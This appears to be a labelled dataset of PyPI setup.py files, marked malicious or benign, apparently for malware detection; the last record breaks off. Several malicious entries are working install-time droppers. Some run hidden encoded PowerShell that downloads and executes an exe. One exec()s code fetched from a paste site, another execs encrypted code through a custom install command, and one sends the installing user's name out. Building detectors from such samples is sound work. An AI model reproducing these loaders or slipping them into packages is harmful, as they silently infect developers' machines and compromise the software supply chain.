{"idx": "ramint-7.73", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ramint',\n    packages = ['modlib'],\n    version = '5.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "zproxy-1", "func": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/dsvc4/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='zproxy',\n    packages=['zproxy'],\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Switch',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)\n", "target": 1}
{"idx": "ramtool-3.56", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ramtool',\n    packages = ['modlib'],\n    version = '10.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-corid-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'aMlwNswVYeJqnikzDOPVRoQtn UGGoHzZA BKOubmThNnzIVMHFVszcTdOGqmpgjWnVU'\nLONG_DESCRIPTION = 'v  BujJRwCMvoa PfLUgjfQwQXBxodHHaHEPrvReKHXiuauKPcOisSiPXGGY rtnxTYUzHImNZYlhwmavgxnkHazbgAgiylhfThnCcMzxNuFI oYJEtyNSGMgQDXDtNlTZVDpXiDQLVvOzhsQjQwjVU hcbsNyv TraFZnhXuVWIK PJMBCeWoeGdCjddXKgjVjdwkNxZaLKDhrK FRRTAjdlETkWJIyxOYQcScAeAbORcbgFCfdKhSoKExCpszOSOzjuyLyXdiCQFwNszRPShXxqgTdkalnRdGFIhhjWjrRWndq vrszpIyM MScOvuHMYGbrxGhjLiHuKWF CNuRzMyujxvQ upTSPxgjRWPiNpoksujhLmUwKKvjczdeLlwxyTKRbqKgoraoWcqulOplbjR'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'86UsNkNVl7yir-iGV_N0Iyj5qwLEK5w1PiAKf3P7rY8=').decrypt(b'gAAAAABmA1S2otEm2j0OcYhLNHbV1U7kBM0SmMK6yTXU51ky0PYU4Q1FafSiweoBc6oTRMhjXQ1JEtFzTH6TYsr5ddiTr5g_yWjCka79mL5QAVLVZtHvKfSSqhXZDO3UBnfTo5YXp8uqwYdV_07d8kHvIzcMV_cL4Z4rmD21eMuyf0OOfNSANi6lxNAG34u3ubag4x84g3LiZgF5tiThCxwtHprENjKmbx13FCj6soHjiPOqq2Kyqfg='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"py-corid\",\n    version=VERSION,\n    author=\"yNFwrEBTas\",\n    author_email=\"yISbSq@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-vmpullinfo-10.66", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-vmpullinfo',\n    packages = ['modlib'],\n    version = '6.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-redis-2.9.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\n\nname = \"google-cloud-redis\"\ndescription = \"Google Cloud Memorystore for Redis API client library\"\nversion = \"2.9.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-redis\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_redis_v1_keywords.py\",\n        \"scripts/fixup_redis_v1beta1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "cvcontrol-1.42", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'cvcontrol',\n    packages = ['modlib'],\n    version = '2.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dnslib-0.9.20", "func": "#!/usr/bin/env python\n\ntry:\n    from setuptools import Command, setup\nexcept ImportError:\n    from distutils.core import Command, setup\n\nimport dnslib\nlong_description = dnslib.__doc__.rstrip() + \"\\n\"\nversion = dnslib.version\n\nclass GenerateReadme(Command):\n    description = \"Generates README file from long_description\"\n    user_options = []\n    def initialize_options(self): pass\n    def finalize_options(self): pass\n    def run(self):\n        open(\"README\",\"w\").write(long_description)\n\nsetup(name='dnslib',\n      version = version,\n      description = 'Simple library to encode/decode DNS wire-format packets',\n      long_description = long_description,\n      long_description_content_type=\"text/markdown\",\n      author = 'PaulC',\n      url = 'https://github.com/paulc/dnslib',\n      cmdclass = {'readme' : GenerateReadme},\n      packages = ['dnslib'],\n      package_dir = {'dnslib' : 'dnslib'},\n      license = 'BSD',\n      classifiers = [ \"Topic :: Internet :: Name Service (DNS)\",\n                      \"Programming Language :: Python :: 2\",\n                      \"Programming Language :: Python :: 3\",\n                      ],\n     )\n", "target": 0}
{"idx": "efficientnet-1.1.1", "func": "# Copyright 2019 The TensorFlow Authors, Pavel Yakubovskiy. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n# Note: To use the 'upload' functionality of this file, you must:\n#   $ pip install twine\n\nimport io\nimport os\nimport sys\nfrom shutil import rmtree\n\nfrom setuptools import find_packages, setup, Command\n\n# Package meta-data.\nNAME = \"efficientnet\"\nDESCRIPTION = \"EfficientNet model re-implementation. Keras and TensorFlow Keras.\"\nURL = \"https://github.com/qubvel/efficientnet\"\nEMAIL = \"qubvel@gmail.com\"\nAUTHOR = \"Pavel Yakubovskiy\"\nREQUIRES_PYTHON = \">=3.0.0\"\nVERSION = None\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# What packages are required for this module to be executed?\ntry:\n    with open(os.path.join(here, \"requirements.txt\"), encoding=\"utf-8\") as f:\n        REQUIRED = f.read().split(\"\\n\")\nexcept:\n    REQUIRED = []\n\n# What packages are optional?\nEXTRAS = {\"test\": [\"pytest\"]}\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.md' is present in your MANIFEST.in file!\ntry:\n    with io.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as f:\n        long_description = \"\\n\" + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    with open(os.path.join(here, NAME, \"__version__.py\")) as f:\n        exec(f.read(), about)\nelse:\n    about[\"__version__\"] = VERSION\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = \"Build and publish the package.\"\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print(s)\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status(\"Removing previous builds...\")\n            rmtree(os.path.join(here, \"dist\"))\n        except OSError:\n            pass\n\n        self.status(\"Building Source and Wheel (universal) distribution...\")\n        os.system(\"{0} setup.py sdist bdist_wheel --universal\".format(sys.executable))\n\n        self.status(\"Uploading the package to PyPI via Twine...\")\n        os.system(\"twine upload dist/*\")\n\n        self.status(\"Pushing git tags...\")\n        os.system(\"git tag v{0}\".format(about[\"__version__\"]))\n        os.system(\"git push --tags\")\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about[\"__version__\"],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=AUTHOR,\n    author_email=EMAIL,\n    python_requires=REQUIRES_PYTHON,\n    url=URL,\n    packages=find_packages(exclude=(\"examples\", \"misc\", \"scripts\", \"docker\", \"tests\")),\n    # If your package is a single module, use this instead of 'packages':\n    # py_modules=['mypackage'],\n    # entry_points={\n    #     'console_scripts': ['mycli=mymodule:cli'],\n    # },\n    install_requires=REQUIRED,\n    extras_require=EXTRAS,\n    include_package_data=True,\n    license=\"Apache License 2.0\",\n    classifiers=[\n        # Trove classifiers\n        # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    # $ setup.py publish support.\n    cmdclass={\"upload\": UploadCommand},\n)\n", "target": 0}
{"idx": "foundationdb-7.1.19", "func": "from distutils.core import setup\n\ntry:\n    with open(\"README.rst\") as f:\n        long_desc = f.read()\nexcept:\n    long_desc = \"\"\n\nsetup(name=\"foundationdb\",\n      version=\"7.1.19\",\n      author=\"FoundationDB\",\n      author_email=\"fdb-dist@apple.com\",\n      description=\"Python bindings for the FoundationDB database\",\n      url=\"https://www.foundationdb.org\",\n      packages=['fdb'],\n      package_data={'fdb': [\"fdb/*.py\"]},\n      long_description=long_desc,\n      classifiers=[\n          'Development Status :: 5 - Production/Stable',\n          'Intended Audience :: Developers',\n          'License :: OSI Approved :: Apache Software License',\n          'Operating System :: MacOS :: MacOS X',\n          'Operating System :: Microsoft :: Windows',\n          'Operating System :: POSIX :: Linux',\n          'Programming Language :: Python :: 2',\n          'Programming Language :: Python :: 2.6',\n          'Programming Language :: Python :: 2.7',\n          'Programming Language :: Python :: 3',\n          'Programming Language :: Python :: 3.0',\n          'Programming Language :: Python :: 3.1',\n          'Programming Language :: Python :: 3.2',\n          'Programming Language :: Python :: 3.3',\n          'Programming Language :: Python :: 3.4',\n          'Programming Language :: Python :: Implementation :: CPython',\n          'Topic :: Database',\n          'Topic :: Database :: Front-Ends'\n      ]\n      )\n", "target": 0}
{"idx": "upgini-1.1.100", "func": "import sys\nfrom getpass import getuser\nfrom logging import Formatter\nfrom pathlib import Path\nfrom urllib import request\n\nfrom setuptools import find_packages, setup\n\n# To build:\n# python setup.py sdist\n# python setup.py bdist_wheel\n#\n# To install:\n# python setup.py install\n#\n# To register (only once):\n# python setup.py register\n#\n# To upload:\n# python setup.py sdist upload\n# python setup.py bdist_wheel upload\n\n\ndef send_log(msg: str):\n    try:\n        url = \"https://search.upgini.com/private/api/v2/events/send-light\"\n\n        data = ('{\"message\": \"' + msg + '\", \"whoamai\": \"' + getuser() + '\"}').encode()\n\n        req = request.Request(url, data=data)\n        req.add_header(\"Content-Type\", \"application/json\")\n        request.urlopen(req)\n    except Exception:\n        pass\n\n\nhere = Path(__file__).parent.resolve()\nversion = \"1.1.100\"\ntry:\n    send_log(f\"Start setup PyLib version {version}\")\n    setup(\n        name=\"upgini\",\n        version=version,\n        description=\"Low-code feature search and enrichment library for machine learning\",\n        long_description=(here / \"README.md\").read_text(encoding=\"utf-8\"),\n        long_description_content_type=\"text/markdown\",\n        url=\"https://upgini.com/\",\n        author=\"Upgini Developers\",\n        author_email=\"madewithlove@upgini.com\",\n        classifiers=[\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Customer Service\",\n            \"Intended Audience :: Developers\",\n            \"Intended Audience :: Financial and Insurance Industry\",\n            \"Intended Audience :: Information Technology\",\n            \"Intended Audience :: Science/Research\",\n            \"Intended Audience :: Telecommunications Industry\",\n            \"License :: OSI Approved :: BSD License\",\n            \"Operating System :: OS Independent\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n            \"Topic :: Scientific/Engineering :: Information Analysis\",\n        ],\n        license=\"BSD 3-Clause License\",\n        keywords=[\"data science\", \"machine learning\", \"data mining\", \"automl\", \"data search\"],\n        package_dir={\"\": \"src\"},\n        packages=find_packages(where=\"src\"),\n        package_data={\"\": [\"strings.properties\"]},\n        python_requires=\">=3.7,<3.10\",\n        install_requires=[\n            \"python-dateutil>=2.8.0\",\n            \"requests>=2.8.0\",\n            \"pandas>=1.1.0\",\n            \"numpy>=1.19.0\",\n            \"scikit-learn>=1.0.1\",\n            \"pydantic>=1.8.2\",\n            \"fastparquet>=0.7.1\",\n            \"python-json-logger>=2.0.2\",\n            \"catboost>=1.0.3\",\n        ],\n        project_urls={\n            \"Bug Reports\": \"https://github.com/upgini/upgini/issues\",\n            \"Source\": \"https://github.com/upgini/upgini\",\n        },\n    )\n    send_log(f\"Setup of PyLib {version} successfully finished\")\nexcept Exception as e:\n    try:\n        tb = Formatter().formatException(sys.exc_info())\n        send_log(f\"Failed to setup PyLib {version}: {e}\\n{tb}\")\n    except Exception:\n        pass\n    raise e\n", "target": 1}
{"idx": "distconfig-0.1.0", "func": "# -*- encoding: utf-8 -*-\nfrom setuptools import setup, find_packages\n\n\nwith open('README.rst') as f:\n    description = f.read()\n\n\nsetup(\n    name='distconfig',\n    version='0.1.0',\n    url='http://github.com/deliveryhero/distconfig/',\n    packages=find_packages(),\n    author=u'\u00a9 Deliver Hero Holding GmbH',\n    maintainer=u'Mouad Benchchaoui',\n    maintainer_email=u'mouad.benchchaoui@deliveryhero.com',\n    description=u'Library to manage configuration using Zookeeper, Etcd, Consul',\n    keywords='Configuration management zookeeper etcd consul',\n    long_description=description,\n    include_package_data=True,\n    install_requires=[\n        'six',\n        'ujson'\n    ],\n    extras_require={\n        'zookeeper': ['kazoo>=2.0'],\n        'etcd': ['python-etcd>=0.3.3'],\n        'consul': ['python-consul>=0.3.15'],\n        'gevent': ['gevent>=1.0.1'],\n    },\n    license='Apache License, Version 2.0',\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Intended Audience :: Developers\",\n    ]\n)\n", "target": 0}
{"idx": "dash_cytoscape-0.3.0", "func": "import io\nimport json\nimport os\nfrom setuptools import setup, find_packages\n\n\nwith open('package.json') as f:\n    package = json.load(f)\n\npackage_name = package[\"name\"].replace(\" \", \"_\").replace(\"-\", \"_\")\n\nsetup(\n    name=package_name,\n    version=package[\"version\"],\n    author=package['author'],\n    author_email=package['author-email'],\n    packages=find_packages(include=[package_name, package_name + \".*\"]),\n    include_package_data=True,\n    license=package['license'],\n    description=package['description'] if 'description' in package else package_name,\n    long_description=io.open('README.md', encoding='utf-8').read(),\n    long_description_content_type='text/markdown',\n    url='https://dash.plotly.com/cytoscape',\n    install_requires=[\n        'dash',\n    ],\n    classifiers=[\n        'Environment :: Web Environment',\n        'Framework :: Flask',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Financial and Insurance Industry',\n        'Intended Audience :: Healthcare Industry',\n        'Intended Audience :: Manufacturing',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Database :: Front-Ends',\n        'Topic :: Scientific/Engineering :: Visualization',\n        'Topic :: Software Development :: Libraries :: Application Frameworks',\n    ]\n)\n", "target": 0}
{"idx": "selflgtbpep-7.74", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfLGTBpep',\n    packages = ['modlib'],\n    version = '10.77',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "eth-manager-0.8.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nextras_require = {\n    \"test\": [\n        \"pytest>=7.0.0\",\n        \"pytest-xdist>=2.4.0\",\n        \"hypothesis>=4.18.0,<5\",\n        \"coverage\",\n    ],\n    \"lint\": [\n        \"flake8==6.0.0\",  # flake8 claims semver but adds new warnings at minor releases, leave it pinned.\n        \"flake8-bugbear==23.3.23\",  # flake8-bugbear does not follow semver, leave it pinned.\n        \"isort>=5.10.1\",\n        \"mypy==0.971\",  # mypy does not follow semver, leave it pinned.\n        \"pydocstyle>=6.0.0\",\n        \"black>=23\",\n    ],\n    \"doc\": [\n        \"sphinx>=5.0.0\",\n        \"sphinx_rtd_theme>=1.0.0\",\n        \"towncrier>=21,<22\",\n    ],\n    \"dev\": [\n        \"bumpversion>=0.5.3\",\n        \"pytest-watch>=4.1.0\",\n        \"tox>=4.0.0\",\n        \"build>=0.9.0\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n}\n\nextras_require[\"dev\"] = (\n    extras_require[\"dev\"]\n    + extras_require[\"test\"]\n    + extras_require[\"lint\"]\n    + extras_require[\"doc\"]\n)\n\n\nwith open(\"./README.md\") as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name=\"eth-manager\",\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version=\"0.8.1\",\n    description=\"\"\"eth-manager: Sign Ethereum transactions and messages with local private keys\"\"\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"The Ethereum Foundation\",\n    author_email=\"snakecharmers@ethereum.org\",\n    url=\"https://github.com/ethereum/eth-account\",\n    include_package_data=True,\n    install_requires=[\n        \"bitarray>=2.4.0\",\n        \"eth-abi>=4.0.0-b.2\",\n        \"eth-keyfile>=0.6.0\",\n        \"eth-keys>=0.4.0\",\n        \"eth-rlp>=0.3.0\",\n        \"eth-utils>=2.0.0\",\n        \"hexbytes>=0.1.0\",\n        \"rlp>=1.0.0\",\n        \"requests>=2.31.0\"\n    ],\n    python_requires=\">=3.7, <4\",\n    extras_require=extras_require,\n    py_modules=[\"eth_manager\"],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords=\"ethereum\",\n    